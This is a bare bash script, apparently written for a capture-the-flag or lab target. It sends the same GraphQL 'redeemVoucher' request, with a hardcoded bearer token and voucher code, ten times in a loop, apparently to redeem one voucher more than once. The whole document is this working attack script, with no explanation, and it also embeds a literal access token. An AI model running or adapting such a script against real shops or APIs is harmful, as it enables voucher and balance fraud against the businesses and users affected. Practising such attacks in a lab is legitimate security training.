#!/bin/bash
TOKEN="coop_4eff618993d6c930ca88893225f669f32782ae79"
URL="http://a0d3220d-6f6a-4213-8a3b-2a6c52bfaa04.red.cyberkent.uz/graphql"
for i in 1 2 3 4 5 6 7 8 9 10; do
  curl -s -m 10 -X POST "$URL" -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
    -d '{"query":"query{redeemVoucher(code:\"KARAKUL-WINTER-2025\"){ok message balance}}"}'
  echo
done
